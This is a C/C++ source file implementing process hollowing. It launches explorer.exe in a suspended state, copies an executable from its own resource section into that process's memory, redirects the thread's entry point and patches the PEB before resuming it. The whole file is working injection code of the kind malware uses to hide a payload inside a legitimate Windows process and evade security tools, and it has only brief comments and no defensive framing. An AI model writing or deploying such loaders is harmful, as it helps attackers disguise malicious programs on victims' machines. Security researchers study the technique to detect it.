#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>
#include "resource.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	const int baseAddrLength = 4;
	const int pebImageBaseAddrOffset = 8;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE handleNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;

	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed: %d.\n", GetLastError());
	}



	PROCESS_BASIC_INFORMATION pbi;

	/* Retrieves ProcessBasicInformaton info from the created process */
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	/* Retrieves PEB info of the created process */
	PPEB pPeb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pPeb, sizeof(PEB), 0);

	/* Find and load exe stored in the PE's resource section */
	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL resourceData = LoadResource(NULL, resource);

	/* Get pointer to the resource base address */
	LPVOID lpBaseAddressResource = LockResource(resourceData);


	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddressResource;

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid DOS signature %i", GetLastError());
	}
		
	PIMAGE_NT_HEADERS pNTHeaderYo = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);

	/* Allocate virtual memory for the process which is to be injected */
	VirtualAllocEx(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	PBYTE pHeaderBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders];

	memcpy(pHeaderBuffer, pDosHeader, pNTHeaderYo->OptionalHeader.SizeOfHeaders);

	if (!WriteProcessMemory(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, pHeaderBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: Unable to write headers: %i", GetLastError());
		return -1;
	}

	
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pNTHeaderYo);

	for (int i = 0; i < pNTHeaderYo->FileHeader.NumberOfSections; i++)
	{
		printf("Copying data from: %s\n", sectionHeader->Name);

		PBYTE pSectionData = new BYTE[(DWORD)sectionHeader->SizeOfRawData];

		memcpy(pSectionData, (PVOID)((DWORD)pDosHeader + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);

		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)sectionHeader->VirtualAddress), pSectionData, (DWORD)sectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed copying data from %s: %i", sectionHeader->Name, GetLastError());
			return -1;
		}
		sectionHeader++;
	}
	
	/* Retrieve the suspended procceses current context */
	PCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, lpContext);

	/* Set the Orginal Entry Point (OEP) value */
	lpContext->Eax = (DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)pNTHeaderYo->OptionalHeader.AddressOfEntryPoint;

	/* Set the suspended exe context with the updated eax value which points to the injected code */
	SetThreadContext(pi.hThread, lpContext);

	/* Overwrite the PEB base address with the image base address of the injected exe */
	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &pNTHeaderYo->OptionalHeader.ImageBase, baseAddrLength, NULL);

	/* Resume the created processes main thread with the updated OEP */
	ResumeThread(pi.hThread);


	printf("\nCreated Process id: %i\n", pi.dwProcessId);
	printf("Created process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
	printf("Created process Image Base Address 0x%x\n", pPeb->ImageBaseAddress);
	printf("Injected process Image Base Address 0x%x\n", pNTHeaderYo->OptionalHeader.ImageBase);

	return 0;
}